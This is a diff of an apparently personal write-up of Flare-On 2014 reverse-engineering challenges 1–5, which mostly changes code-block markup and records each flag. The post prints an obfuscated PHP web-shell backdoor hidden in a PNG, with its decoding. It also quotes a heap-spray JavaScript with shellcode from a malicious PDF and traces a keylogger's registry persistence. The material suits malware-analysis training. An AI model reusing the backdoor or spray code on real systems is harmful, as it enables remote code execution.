@@ -60,13 +60,13 @@ The challenge starts with going to their website at [http://flare-on.com](http:/
 
 I opened it with ``7-zip`` to get ``Challenge1.exe``. By dropping it into ``PE-Studio`` I gained more information:
 
-```
+{% codeblock PE-Studio info >}}
 The Image is a fake Microsoft executable    # Company name is Microsoft but it is not signed?
 The Manifest Identity name (MyApplication.app) is different than the Image name
 The Version Information 'OriginalFilename' (rev_challenge_1.exe) is different than the Image name
 The Debug Symbol File Name () is different than the Image name (challenge1)
 The image is Managed (.NET)
-```
+{% endcodeblock >}}
 
 So it appears to be a .Net binary. Let's run it.
 
@@ -78,7 +78,7 @@ Hey I love this guy. Let's press ``DECODE.``
 
 Look at that garbled data. We can decompile it (remember it's a .Net binary). Using ``dotPeek`` we can see the code for ``Decode`` button:
 
-{{< codecaption lang="c#" title="btnDecode_click" >}}
+{% codeblock lang:c# btnDecode_click >}}
 private void btnDecode_Click(object sender, EventArgs e)
 {
   this.pbRoge.Image = (Image) Resources.bob_roge; // change the image
@@ -105,7 +105,7 @@ private void btnDecode_Click(object sender, EventArgs e)
   }
   this.lbl_title.Text = str4;
 }
-{{< /codecaption >}}
+{% endcodeblock >}}
 
 Line 4 reads ``dat_secret`` and the rest of the function manipulates it before displaying it on the form. To save this file expand ``resources`` and select ``rev_challenge_1.dat_secret.encode``. Right click and select ``Save Resource to File.``
 
@@ -113,14 +113,14 @@ Line 4 reads ``dat_secret`` and the rest of the function manipulates it before d
 
 I used ``HxD`` to look at the contents.
 
-{{< codecaption title="Contents of dat_secret" lang="bash" >}}
+{% codeblock Contents of dat_secret >}}
 A1 B5 44 84 14 E4 A1 B5 D4 70 B4 91 B4 70 D4 91 E4 C4 96 F4 54 84 B5 C4 40 64 74 70 A4 64 44
 ¡µD„.ä¡µÔp´‘´pÔ‘äÄ–ôT„µÄ@dtp¤dD
-{{< /codecaption >}}
+{% endcodeblock >}}
 
 Let's run the code with ``dat_secret`` and print the result after each level (i.e. ``str2, str3 and str4``). One option is to use the provided C# code. I re-wrote the code in Python and ran it online using [repl.it](http://repl.it/languages). Str1 is the answer so we don't care about the rest:
 
-{{< codecaption lang="python" title="Decoding dat_secret" >}}
+{% codeblock lang:python Decoding dat_secret >}}
 from binascii import unhexlify
 
 datsecret = unhexlify ("A1B5448414E4A1B5D470B491B470D491E4C496F45484B5C440647470A46444")
@@ -131,9 +131,11 @@ for item in datsecret:
     str1 +=  chr( ( num >> 4 | num << 4 & 240) ^ 41 )
 
 print str1
-{{< /codecaption >}}
+{% endcodeblock >}}
 
-#### Level 1 flag: 3rmahg3rd.b0b.d0ge@flare-on.com
+{% codeblock Flag 1 >}}
+3rmahg3rd.b0b.d0ge@flare-on.com
+{% endcodeblock >}}
 
 ---
 
@@ -147,48 +149,48 @@ Hopefully you'll knock this one out too, Good luck!
 ```
 Inside the archive seems to be a copy of the original [http://flare-on.com](http://flare-on.com) with a launch date countdown timer. I will be calling the html page from the website ``original_html`` and the one in the zip file ``challenge_html``.
 
-{{< codecaption lang="powershell" title="Contents of challenge zip file" >}}
+{% codeblock lang:powershell Contents of challenge zip file >}}
 -rwx------+ 1 TyRaX None 8378 home.html
 
 directory called "img" with one single png
 -rwx------+ 1 TyRaX None 9560 flare-on.png
-{{< /codecaption >}}
+{% endcodeblock >}}
 
 ![challenge_html](/images/2014/flare/2-1.jpg "challenge_html")
 
 The original web page looks a bit different.
-{{< codecaption lang="powershell" title="Original web page" >}}
+{% codeblock lang:powershell Original web page >}}
 -rwx------+ 1 TyRaX None 6254 The FLARE On Challenge.htm
 
 and
 -rwx------+ 1 TyRaX None 116290 bootstrap.css
 -rwx------+ 1 TyRaX None   6596 flare-on-V2.png
-{{< /codecaption >}}
+{% endcodeblock >}}
 
 ![original_html](/images/2014/flare/2-2.jpg "original_html")
 
 The timer threw me off track. Is it really a countdown timer? When does it reach zero?  
 I changed the time in my VM to mess with it but it synced up with host.  
 
-{{< codecaption lang="powershell" title="To de-sync guest and host time/date" >}}
+{% codeblock lang:powershell To de-sync guest and host time/date >}}
 # vboxmanage is in the VirtualBox installation directory
 # So on Windows: C:\Program Files\Oracle\VirtualBox
 vboxmanage setextradata [VMname] "VBoxInternal/Devices/VMMDev/0/Config/GetHostTimeDisabled" "1"
-{{< /codecaption >}}
+{% endcodeblock >}}
 
 Changing the time did not mess with anything.
 
 We can diff the htmls or use Notepad++'s [compare](http://www.davidtan.org/how-to-compare-two-text-files-using-notepad-plus/) plugin.
-Most differences are aesthetic. There are two interesting differences. In line 54, ``original_html`` has ``<img src="The%20FLARE%20On%20Challenge_files/flare-on-V2.png">`` while ``challenge_html`` includes ``<img src="img/flare-on.png">``. So the file in the website is version 2 of the image. Later in the ``challenge_html`` we see more evidence of this image file ``<?php include "img/flare-on-V3.png" ?>``. But wait a minute, the filesize of these images were different:
+Most differences are aesthetic. There are two interesting differences. In line 54, ``original_html`` has ``<img src="The%20FLARE%20On%20Challenge_files/flare-on-V2.png">`` while ``challenge_html`` includes ``<img src="img/flare-on.png">``. So the file in the website is version 2 of the image. Later in the ``challenge_html`` we see more evidence of this image file ``<?php include "img/flare-on-V3.png" ?>``. But wiat a minute, the filesize of these images were different:
 
-{{< codecaption lang="powershell" title="Different sizes" >}}
+{% codeblock lang:powershell Different sizes >}}
 -rwx------+ 1 TyRaX None 9560 Jul  7 21:30 flare-on.png
 -rwx------+ 1 TyRaX None 6596 Dec 18  2013 flare-on-V2.png
-{{< /codecaption >}}
+{% endcodeblock >}}
 
 The challenge png is bigger. I used ``HxD`` to compare these two files (as they are not text) and at the end of ``flare-on.png`` I saw some PHP code. To be honest I was thinking of steganography or some [Ange Albertini magic](https://twitter.com/angealbertini). But that would have been too hard for level 2. Here is the PHP code (beautified):
 
-{{< codecaption lang="php" title="Code inside png" >}}
+{% codeblock lang:php Code inside png >}}
 <?php 
 $terms=array("M", "Z", "]", "p", "\\", "w", "f", "1", "v", "<", "a", "Q", "z", " ", "s", "m", "+", "E", "D", "g", "W", "\"", "q", "y", "T", "V", "n", "S", "X", ")", "9", "C", "P", "r", "&", "\'", "!", "x", "G", ":", "2", "~", "O", "h", "u", "U", "@", ";", "H", "3", "F", "6", "b", "L", ">", "^", ",", ".", "l", "$", "d", "`", "%", "N", "*", "[", "0", "}", "J", "-", "5", "_", "A", "=", "{", "k", "o", "7", "#", "i", "I", "Y", "(", "j", "/", "?", "K", "c", "B", "t", "R", "4", "8", "e", "|");
 $order=array(59, 71, 73, 13, 35, 10, 20, 81, 76, 10, 28, 63, 12, 1, 28, 11, 76, 68, 50, 30, 11, 24, 7, 63, 45, 20, 23, 68, 87, 42, 24, 60, 87, 63, 18, 58, 87, 63, 18, 58, 87, 63, 83, 43, 87, 93, 18, 90, 38, 28, 18, 19, 66, 28, 18, 17, 37, 63, 58, 37, 91, 63, 83, 43, 87, 42, 24, 60, 87, 93, 18, 87, 66, 28, 48, 19, 66, 63, 50, 37, 91, 63, 17, 1, 87, 93, 18, 45, 66, 28, 48, 19, 40, 11, 25, 5, 70, 63, 7, 37, 91, 63, 12, 1, 87, 93, 18, 81, 37, 28, 48, 19, 12, 63, 25, 37, 91, 63, 83, 63, 87, 93, 18, 87, 23, 28, 18, 75, 49, 28, 48, 19, 49, 0, 50, 37, 91, 63, 18, 50, 87, 42, 18, 90, 87, 93, 18, 81, 40, 28, 48, 19, 40, 11, 7, 5, 70, 63, 7, 37, 91, 63, 12, 68, 87, 93, 18, 81, 7, 28, 48, 19, 66, 63, 50, 5, 40, 63, 25, 37, 91, 63, 24, 63, 87, 63, 12, 68, 87, 0, 24, 17, 37, 28, 18, 17, 37, 0, 50, 5, 40, 42, 50, 5, 49, 42, 25, 5, 91, 63, 50, 5, 70, 42, 25, 37, 91, 63, 75, 1, 87, 93, 18, 1, 17, 80, 58, 66, 3, 86, 27, 88, 77, 80, 38, 25, 40, 81, 20, 5, 76, 81, 15, 50, 12, 1, 24, 81, 66, 28, 40, 90, 58, 81, 40, 30, 75, 1, 27, 19, 75, 28, 7, 88, 32, 45, 7, 90, 52, 80, 58, 5, 70, 63, 7, 5, 66, 42, 25, 37, 91, 0, 12, 50, 87, 63, 83, 43, 87, 93, 18, 90, 38, 28, 48, 19, 7, 63, 50, 5, 37, 0, 24, 1, 87, 0, 24, 72, 66, 28, 48, 19, 40, 0, 25, 5, 37, 0, 24, 1, 87, 93, 18, 11, 66, 28, 18, 87, 70, 28, 48, 19, 7, 63, 50, 5, 37, 0, 18, 1, 87, 42, 24, 60, 87, 0, 24, 17, 91, 28, 18, 75, 49, 28, 18, 45, 12, 28, 48, 19, 40, 0, 7, 5, 37, 0, 24, 90, 87, 93, 18, 81, 37, 28, 48, 19, 49, 0, 50, 5, 40, 63, 25, 5, 91, 63, 50, 5, 37, 0, 18, 68, 87, 93, 18, 1, 18, 28, 48, 19, 40, 0, 25, 5, 37, 0, 24, 90, 87, 0, 24, 72, 37, 28, 48, 19, 66, 63, 50, 5, 40, 63, 25, 37, 91, 63, 24, 63, 87, 63, 12, 68, 87, 0, 24, 17, 37, 28, 48, 19, 40, 90, 25, 37, 91, 63, 18, 90, 87, 93, 18, 90, 38, 28, 18, 19, 66, 28, 18, 75, 70, 28, 48, 19, 40, 90, 58, 37, 91, 63, 75, 11, 79, 28, 27, 75, 3, 42, 23, 88, 30, 35, 47, 59, 71, 71, 73, 35, 68, 38, 63, 8, 1, 38, 45, 30, 81, 15, 50, 12, 1, 24, 81, 66, 28, 40, 90, 58, 81, 40, 30, 75, 1, 27, 19, 75, 28, 23, 75, 77, 1, 28, 1, 43, 52, 31, 19, 75, 81, 40, 30, 75, 1, 27, 75, 77, 35, 47, 59, 71, 71, 71, 73, 21, 4, 37, 51, 40, 4, 7, 91, 7, 4, 37, 77, 49, 4, 7, 91, 70, 4, 37, 49, 51, 4, 51, 91, 4, 37, 70, 6, 4, 7, 91, 91, 4, 37, 51, 70, 4, 7, 91, 49, 4, 37, 51, 6, 4, 7, 91, 91, 4, 37, 51, 70, 21, 47, 93, 8, 10, 58, 82, 59, 71, 71, 71, 82, 59, 71, 71, 29, 29, 47);
@@ -202,11 +204,11 @@ for ($i=0;$i<count($order);$i++)
 
 eval($do_me); 
 ?>
-{{< /codecaption >}}
+{% endcodeblock >}}
 
 Find an online tool to run this PHP code or re-write it in Python . My Python code:
 
-{{< codecaption lang="python" title="Code re-written in Python" >}}
+{% codeblock lang:python Code re-written in Python >}}
 terms = ["M", "Z", "]", "p", "\\", "w", "f", "1", "v", "<", "a", "Q", "z", " ", "s", "m", "+", "E", "D", "g", "W", "\"", "q", "y", "T", "V", "n", "S", "X", ")", "9", "C", "P", "r", "&", "\'", "!", "x", "G", ":", "2", "~", "O", "h", "u", "U", "@", ";", "H", "3", "F", "6", "b", "L", ">", "^", ",", ".", "l", "$", "d", "`", "%", "N", "*", "[", "0", "}", "J", "-", "5", "_", "A", "=", "{", "k", "o", "7", "#", "i", "I", "Y", "(", "j", "/", "?", "K", "c", "B", "t", "R", "4", "8", "e", "|"]
 
 order= [59, 71, 73, 13, 35, 10, 20, 81, 76, 10, 28, 63, 12, 1, 28, 11, 76, 68, 50, 30, 11, 24, 7, 63, 45, 20, 23, 68, 87, 42, 24, 60, 87, 63, 18, 58, 87, 63, 18, 58, 87, 63, 83, 43, 87, 93, 18, 90, 38, 28, 18, 19, 66, 28, 18, 17, 37, 63, 58, 37, 91, 63, 83, 43, 87, 42, 24, 60, 87, 93, 18, 87, 66, 28, 48, 19, 66, 63, 50, 37, 91, 63, 17, 1, 87, 93, 18, 45, 66, 28, 48, 19, 40, 11, 25, 5, 70, 63, 7, 37, 91, 63, 12, 1, 87, 93, 18, 81, 37, 28, 48, 19, 12, 63, 25, 37, 91, 63, 83, 63, 87, 93, 18, 87, 23, 28, 18, 75, 49, 28, 48, 19, 49, 0, 50, 37, 91, 63, 18, 50, 87, 42, 18, 90, 87, 93, 18, 81, 40, 28, 48, 19, 40, 11, 7, 5, 70, 63, 7, 37, 91, 63, 12, 68, 87, 93, 18, 81, 7, 28, 48, 19, 66, 63, 50, 5, 40, 63, 25, 37, 91, 63, 24, 63, 87, 63, 12, 68, 87, 0, 24, 17, 37, 28, 18, 17, 37, 0, 50, 5, 40, 42, 50, 5, 49, 42, 25, 5, 91, 63, 50, 5, 70, 42, 25, 37, 91, 63, 75, 1, 87, 93, 18, 1, 17, 80, 58, 66, 3, 86, 27, 88, 77, 80, 38, 25, 40, 81, 20, 5, 76, 81, 15, 50, 12, 1, 24, 81, 66, 28, 40, 90, 58, 81, 40, 30, 75, 1, 27, 19, 75, 28, 7, 88, 32, 45, 7, 90, 52, 80, 58, 5, 70, 63, 7, 5, 66, 42, 25, 37, 91, 0, 12, 50, 87, 63, 83, 43, 87, 93, 18, 90, 38, 28, 48, 19, 7, 63, 50, 5, 37, 0, 24, 1, 87, 0, 24, 72, 66, 28, 48, 19, 40, 0, 25, 5, 37, 0, 24, 1, 87, 93, 18, 11, 66, 28, 18, 87, 70, 28, 48, 19, 7, 63, 50, 5, 37, 0, 18, 1, 87, 42, 24, 60, 87, 0, 24, 17, 91, 28, 18, 75, 49, 28, 18, 45, 12, 28, 48, 19, 40, 0, 7, 5, 37, 0, 24, 90, 87, 93, 18, 81, 37, 28, 48, 19, 49, 0, 50, 5, 40, 63, 25, 5, 91, 63, 50, 5, 37, 0, 18, 68, 87, 93, 18, 1, 18, 28, 48, 19, 40, 0, 25, 5, 37, 0, 24, 90, 87, 0, 24, 72, 37, 28, 48, 19, 66, 63, 50, 5, 40, 63, 25, 37, 91, 63, 24, 63, 87, 63, 12, 68, 87, 0, 24, 17, 37, 28, 48, 19, 40, 90, 25, 37, 91, 63, 18, 90, 87, 93, 18, 90, 38, 28, 18, 19, 66, 28, 18, 75, 70, 28, 48, 19, 40, 90, 58, 37, 91, 63, 75, 11, 79, 28, 27, 75, 3, 42, 23, 88, 30, 35, 47, 59, 71, 71, 73, 35, 68, 38, 63, 8, 1, 38, 45, 30, 81, 15, 50, 12, 1, 24, 81, 66, 28, 40, 90, 58, 81, 40, 30, 75, 1, 27, 19, 75, 28, 23, 75, 77, 1, 28, 1, 43, 52, 31, 19, 75, 81, 40, 30, 75, 1, 27, 75, 77, 35, 47, 59, 71, 71, 71, 73, 21, 4, 37, 51, 40, 4, 7, 91, 7, 4, 37, 77, 49, 4, 7, 91, 70, 4, 37, 49, 51, 4, 51, 91, 4, 37, 70, 6, 4, 7, 91, 91, 4, 37, 51, 70, 4, 7, 91, 49, 4, 37, 51, 6, 4, 7, 91, 91, 4, 37, 51, 70, 21, 47, 93, 8, 10, 58, 82, 59, 71, 71, 71, 82, 59, 71, 71, 29, 29, 47]
@@ -216,20 +218,20 @@ for i in range(0,len(order)):
     do_me += terms[order[i]]
 
 print do_me
-{{< /codecaption >}}
+{% endcodeblock >}}
 
 Produces the following PHP code:
-{{< codecaption lang="php" title="PHP code" >}}
+{% codeblock lang:php >}}
 $_= 'aWYoaXNzZXQoJF9QT1NUWyJcOTdcNDlcNDlcNjhceDRGXDg0XDExNlx4NjhcOTdceDc0XHg0NFx4NEZceDU0XHg2QVw5N1x4NzZceDYxXHgzNVx4NjNceDcyXDk3XHg3MFx4NDFcODRceDY2XHg2Q1w5N1x4NzJceDY1XHg0NFw2NVx4NTNcNzJcMTExXDExMFw2OFw3OVw4NFw5OVx4NkZceDZEIl0pKSB7IGV2YWwoYmFzZTY0X2RlY29kZSgkX1BPU1RbIlw5N1w0OVx4MzFcNjhceDRGXHg1NFwxMTZcMTA0XHg2MVwxMTZceDQ0XDc5XHg1NFwxMDZcOTdcMTE4XDk3XDUzXHg2M1wxMTRceDYxXHg3MFw2NVw4NFwxMDJceDZDXHg2MVwxMTRcMTAxXHg0NFw2NVx4NTNcNzJcMTExXHg2RVx4NDRceDRGXDg0XDk5XHg2Rlx4NkQiXSkpOyB9';
 $__='JGNvZGU9YmFzZTY0X2RlY29kZSgkXyk7ZXZhbCgkY29kZSk7';
 $___="\x62\141\x73\145\x36\64\x5f\144\x65\143\x6f\144\x65"; // base64_decode
 eval($___($__));
-{{< /codecaption >}}
+{% endcodeblock >}}
 
 Contents of ``$_`` and ``$__`` are clearly encoded in ``base64`` and  ``$___`` is ``base64_decode``. Base64 can be decoded in Python by calling ``base64.b64decode``.
 Line #4 can be re-written as 
 
-{{< codecaption lang="php" title="Line 4" >}}
+{% codeblock lang:php >}}
 
 eval(base64_decode('JGNvZGU9YmFzZTY0X2RlY29kZSgkXyk7ZXZhbCgkY29kZSk7'));
 
@@ -237,32 +239,36 @@ eval(base64_decode('JGNvZGU9YmFzZTY0X2RlY29kZSgkXyk7ZXZhbCgkY29kZSk7'));
 
 $code=base64_decode($_);    eval($code);
 
-{{< /codecaption >}}
+{% endcodeblock >}}
 
 So it must decode the first base64 blob and eval it. Let's decode it:
 
-{{< codecaption lang="php" title="Decoded line 4" >}}
+{% codeblock lang:php >}}
 
 if(isset($_POST["\97\49\49\68\x4F\84\116\x68\97\x74\x44\x4F\x54\x6A\97\x76\x61\x35\x63\x72\97\x70\x41\84\x66\x6C\97\x72\x65\x44\65\x53\72\111\110\68\79\84\99\x6F\x6D"])) 
 { 
 eval(base64_decode($_POST["\97\49\x31\68\x4F\x54\116\104\x61\116\x44\79\x54\106\97\118\97\53\x63\114\x61\x70\65\84\102\x6C\x61\114\101\x44\65\x53\72\111\x6E\x44\x4F\84\99\x6F\x6D"])); 
 }
 
-{{< /codecaption >}}
+{% endcodeblock >}}
 
 This looks like a POST request. The characters look like a mix of ASCII and Hex values. Let's print them using Python and hope this is the last encoding:
 
-{{< codecaption lang="python" title="Decoder code in Python" >}}
+{% codeblock lang:python >}}
 
 mylist= [97,49,49,68,0x4F,84,116,0x68,97,0x74,0x44,0x4F,0x54,0x6A,97,0x76,0x61,0x35,0x63,0x72,97,0x70,0x41,84,0x66,0x6C,97,0x72,0x65,0x44,65,0x53,72,111,110,68,79,84,99,0x6F,0x6D]
 
 print ''.join( chr(item) for item in mylist)
 
-{{< /codecaption >}}
+{% endcodeblock >}}
 
 Fortunately, we are done.
 
-#### Level 2 flag: a11DOTthatDOTjava5crapATflareDASHonDOTcom or a11.that.java5crap@flare-on.com
+{% codeblock Flag 2 >}}
+a11DOTthatDOTjava5crapATflareDASHonDOTcom
+or
+a11.that.java5crap@flare-on.com
+{% endcodeblock >}}
 
 ---
 
@@ -284,7 +290,9 @@ I cheated in this challenge. I just dropped the executable in ``Immunity Debugge
 
 ![Flag in memory](/images/2014/flare/3-2.jpg "Flag in memory")
 
-#### Level 3 flag: such.5h311010101@flare-on.com
+{% codeblock Flag 3 >}}
+such.5h311010101@flare-on.com
+{% endcodeblock >}}
 
 ---
 
@@ -296,12 +304,12 @@ Here's the next challenge, password is the same as last time. We'll talk more wh
 -FLARE
 ```
 
-It's a two page PDF named ``APT9001.pdf``. First page is a picture of APT1 report and second page is empty.
+It's a two page PDF name ``APT9001.pdf``. First page is a picture of APT1 report and second page is empty.
 We can just open the PDF in a ``HxD`` but it won't tell us much.
 There are tools that will help us parse the PDF. I used ``pyew``. You can find a good tutorial for PDF analysis [here](https://code.google.com/p/pyew/wiki/PDFAnalysis).  
 Let's follow the tutorial:
 
-{{< codecaption lang="python" title="pyew output for the PDF" >}}
+{% codeblock lang:powershell pyew output for the PDF >}}
 
 $ python pyew.py APT9001.pdf
 PDF File
@@ -344,7 +352,7 @@ Stream 2 uses ASCIIHexDecode
 Stream 2 uses JBIG2Decode
 Stream 3 uses FlateDecode
 
-{{< /codecaption >}}
+{% endcodeblock >}}
 
 Seems like streams 1,2 and 3 are interesting. According to the tutorial ``pdfvi`` displays them.
 
@@ -354,7 +362,7 @@ Seems like streams 1,2 and 3 are interesting. According to the tutorial ``pdfvi`
 
 What really threw me off was the ``JBIG2Decode`` decoder for stream 2. There was a [vulnerability](http://vrt-blog.snort.org/2009/02/have-nice-weekend-pdf-love.html) associated with it. It is too short to be the email (14 bytes). It is not compressed (lacks the magic headers). ``Pyew`` also displays the disassembly but it is not shellcode either (if it is, then I didn't recognize it). It is also not an image (hence the ``JBIG2Decode`` filter).
 
-{{< codecaption lang="nasm" title="Stream 2" >}}
+{% codeblock lang:nasm Stream 2 >}}
 Applying Filter FlateDecode ...
 Applying Filter ASCIIHexDecode ...
 Applying Filter JBIG2Decode ...
@@ -374,11 +382,11 @@ Show disassembly (y/n)? [n]: y
 0x0000000c (01) 50                   PUSH EAX
 0x0000000d (01) 50                   PUSH EAX
 
-{{< /codecaption >}}
+{% endcodeblock >}}
 
 Let's take a look at stream 1 using ``pdfvi``.
 
-{{< codecaption lang="js" title="Stream 1" >}}
+{% codeblock lang:js Stream 1 >}}
 
 [0x00000000]> pdfvi
 Applying Filter FlateDecode ...
@@ -451,23 +459,23 @@ u0b7d%u3681%u4542%u4645%uc683%ueb04%ufff1%u68d0%u7365%u0173%udf8b%u5c88%u0324%u5
     while(QCZabMzxQiD.length+bGtvKT < 0x40000) QCZabMzxQiD = QCZabMzxQiD+QCZabMzxQiD+Juphd;
     FovEDIUWBLVcXkOWFAFtYRnPySjMblpAiQIpweE = new Array();
     for (EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA=0;EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA<125;EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA++) FovEDIUWBLVcXkOWFAFtYRnPySjMblpAiQIpweE[EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA]= QCZabMzxQiD + zNfykyBKUZpJbYxaihofpbKLkIDcRxYZWhcohxhunRGf;
-{{< /codecaption >}}
+{% endcodeblock >}}
 
 Obfuscated JavaScript. I executed it and printed the last variable, but the result was garbage. The code just does a lot of computatation. However variable ``IxTUQnOvHg`` looks suspicious. A large number of bytes are unescaped. After reading some guides, I found out how to decode this. ``%u72f9`` should be converted to ``0xf972``. I wrote a simple Python program to do this decoding. Read 6 characters, discard the first two (%u), swap characters 3 and 4 with 5 and 6. The end result is some shellcode. I used this website to convert it to an executable: [http://sandsprite.com/shellcode\_2\_exe.php](http://sandsprite.com/shellcode_2_exe.php).
 
-After running the executable in Immunity debugger a message box pops up with an encoded message. If we look inside memory, we can find this string:
+After running the executable in Immunity a message box pops up with an encoded message. If we look inside memory, we can find this string.
 
 ![MessageBox Text](/images/2014/flare/4-1.jpg "MessageBox Text")
 
-{{< codecaption lang="nasm" title="First string in hex" >}}
+{% codeblock First string in hex >}}
 2574243575216B2A36366B2F3274752E2A2305316B203723256B2B2D46
-{{< /codecaption >}}
+{% endcodeblock >}}
 
 The length is close to the email (29 bytes). Here's what I thought. If it is the email then the last 13 bytes should be ``@flare-on.com``. It's probably xor-ed with a key. If the key is smaller than 13 bytes then it is repeated and we can easily find it. How? xor is transitive. If ``plaintext xor key = ciphertext`` then ``key = plaintext xor ciphertext``. If we xor the last 13 bytes of ciphertext with ``@flare-on.com`` then we will find the last 13 bytes of the key. If key is smaller than plain/ciphertext (if key is as long as plain/ciphertext then we will have a ``one time pad``) it is repeated.
 
 The following Python code does it. On a side note, we really need a string xor operator in Python. I wrote one which is probably not that good.
 
-{{< codecaption lang="python" title="First string xor" >}}
+{% codeblock lang:python First string xor >}}
 def xor(mydata,mykey):
     keylen = len(mykey)
     datalen = len(mydata)
@@ -491,7 +499,7 @@ print hexlify( xor (ciphertext,plaintext) )
 # jEiPELKEHB+
 # 6a45695019451a4c4b4548422b
 
-{{< /codecaption >}}
+{% endcodeblock >}}
 
 Nope. Doesn't look like it.
 
@@ -499,7 +507,7 @@ I usually wander around in the debugger and look at memory. Run the executable i
 
 ![Interesting String](/images/2014/flare/4-2.jpg "Interesting String")
 
-{{< codecaption lang="nasm" title="Second string in hex" >}}
+{% codeblock Second string in hex >}}
 # I did not select the first 00 before 5 (0x0035)
 00143868  35 00 24 00 74 00 25 00  5.$.t.%.
 00143870  2A 00 6B 00 21 00 75 00  *.k.!.u.
@@ -512,11 +520,11 @@ I usually wander around in the debugger and look at memory. Run the executable i
 
 # or in Python-friendly format
 352474252a6b21752f6b36362e7574323105232a2337206b2d2b6b252d28
-{{< /codecaption >}}
+{% endcodeblock >}}
 
 Let's apply the xor-logic on this string too.
 
-{{< codecaption lang="python" title="Second string xor" >}}
+{% codeblock lang:python Second string xor >}}
 # add xor function from last example
 from binascii import hexlify, unhexlify
 
@@ -530,11 +538,13 @@ print hexlify( xor (ciphertext,plaintext) )
 # result :)
 # EEFBEEFBEEFBE
 # 45454642454546424545464245
-{{< /codecaption >}}
+{% endcodeblock >}}
 
 Bingo. The key is ``BEEF``. It is also in the initial shellcode as a string. Let's xor it with the complete string and get the flag.
 
-#### Level 4 flag: wa1ch.d3m.spl01ts@flare-on.com
+{% codeblock Flag 4 >}}
+wa1ch.d3m.spl01ts@flare-on.com
+{% endcodeblock >}}
 
 ---
 
@@ -550,15 +560,15 @@ Here's some more fun for you, password is the same as always.
 
 The file inside the challenge zip is named ``5get_it`` and is around 100KBs. A quick look with ``HxD`` says it's a Portable Executable (MZ and PE magic bytes). Let's get some help from ``PE-Studio``. It has a VirusTotal score of 29/55 with most AVs calling it a generic trojan or keylogger. Click on ``Imported Symbols`` and look at the red symbols. Some of them are more interesting than others. To get more information about any of them, right click and select ``Query MSDN`` inside PE-Studio (handy, neh?).
 
-{{< codecaption lang="nasm" title="Interesting symbols" >}}
+{% codeblock Interesting symbols >}}
 RegSetValueExA - RegCreateKeyA: Messing with registry
 CreateFileW - CreateFileA - WriteFile - CopyFileA: Creating, writing to, and copying file
 GetAsyncKeyState: "Determines whether a key is up or down at the time the function is called, and whether the key was pressed after a previous call to GetAsyncKeyState"
-{{< /codecaption >}}
+{% endcodeblock >}}
 
 Also, let's run ``strings`` on it. I used [cygwin](https://www.cygwin.com/). I have omitted the garbage and only kept the interesting strings:
 
-{{< codecaption lang="nasm" title="Interesting strings" >}}
+{% codeblock Interesting strings >}}
 $ strings.exe 5get_it
 svchost.log
 [SHIFT]
@@ -572,7 +582,7 @@ SOFTWARE\Microsoft\Windows\CurrentVersion\Run
 svchost
 c:\windows\system32\svchost.dll
 c:\windows\system32\rundll32.exe c:\windows\system32\svchost.dll
-{{< /codecaption >}}
+{% endcodeblock >}}
 
 While doing the challenge only the first and last two lines were interesting to me.
 
@@ -593,15 +603,13 @@ Let's start debugging. We observe standard stuff until we reach ``.text:1000A6BB
 
 Inside the function we encounter [RegOpenKeyEx](http://msdn.microsoft.com/en-us/library/windows/desktop/ms724897%28v=vs.85%29.aspx) that opens a registry key. Full registry key is a combination of ``hKey`` and ``lpSubKey``. ``hKey`` can be one of the [predefined keys](http://msdn.microsoft.com/en-us/library/windows/desktop/ms724836%28v=vs.85%29.aspx). The constants for the predefined keys needed a bit of googling because the MSDN page didn't list them. Here they are:
 
-    .
-    | Key                 | Constant |
-    |---------------------|----------|
-    | HKEY_CLASSES_ROOT   |    0     |
-    | HKEY_CURRENT_USER   |    1     |
-    | HKEY_LOCAL_MACHINE  |    2     |
-    | HKEY_USERS          |    3     |
-    | HKEY_CURRENT_CONFIG |    5     |
-    .
+| Key  |   Constant   |
+|---|:---:|
+| HKEY_CLASSES_ROOT  | 0  |
+| HKEY_CURRENT_USER  | 1  |
+| HKEY_LOCAL_MACHINE  | 2 |
+| HKEY_USERS  | 3 |
+| HKEY_CURRENT_CONFIG   | 5 |
 
 The binary is pushing ``0x02`` for ``hKey`` and ``SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run`` for ``lpSubKey`` which will result in the full path ``HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run``. If function succeeds it will return ``ERROR_SUCCESS`` which is 0 according to [this page](http://msdn.microsoft.com/en-us/library/windows/desktop/ms681382%28v=vs.85%29.aspx), otherwise it will return another error code.
 
@@ -610,17 +618,15 @@ The binary is pushing ``0x02`` for ``hKey`` and ``SOFTWARE\\Microsoft\\Windows\\
 The binary will check if it has access to registry at that path. If so then the return value (in eax) will be 0 and it will jump right (JZ will succeed).  
 [RegQueryValueEx](http://msdn.microsoft.com/en-us/library/windows/desktop/ms724911%28v=vs.85%29.aspx) checks if there is a registry key at an open path. It is looking for a registry key named ``svchost`` at that path. If such key exists, function will return 0. In this case, it returned 2 which stands for ``ERROR_FILE_NOT_FOUND`` meaning there was no such key. Then it will call [RegCloseKey](http://msdn.microsoft.com/en-us/library/windows/desktop/ms724837%28v=vs.85%29.aspx) and closes the open registry path. This function's return value is saved in ``var_110`` (we will need it later):
 
-    .
-    |           Condition          |         Return Value          |
-    |------------------------------|-------------------------------|
-    |Registry key cannot be opened |               1               |
-    |Registry key does not exist   |               2               |
-    |Registry key exists           | 1000A6BB or DllMain(x,x,x)+3B |
-    .
+| Condition | Return Value |
+|---|:---:|
+|Registry key cannot be opened | 1 |
+|Registry key does not exist | 2 |
+|Registry key exists | 1000A6BB or DllMain(x,x,x)+3B |
 
 After that function, we see that it is calling ``GetModuleHandleEx`` for ``sub_1000A610`` in lines 3-8 and checks the return value in line 9. The return value for [GetModuleHandleEx](http://msdn.microsoft.com/en-us/library/windows/desktop/ms683200%28v=vs.85%29.aspx) will be non-zero, otherwise it will be zero. If call was not successful then last error will be printed to file.
 
-{{< codecaption lang="nasm" title="Returning from sub_1000A570" >}}
+{% codeblock lang:nasm Returning from sub_1000A570>}}
 .text:1000A6BB call    sub_1000A570
 .text:1000A6C0 mov     [ebp+var_110], eax              ; return value stored in var_110
 .text:1000A6C6 mov     [ebp+phModule], 0
@@ -641,11 +647,11 @@ After that function, we see that it is calling ``GetModuleHandleEx`` for ``sub_1
 .text:1000A708 push    eax                             ; FILE *
 .text:1000A709 call    _fprintf
 .text:1000A70E add     esp, 0Ch
-{{< /codecaption >}}
+{% endcodeblock >}}
 
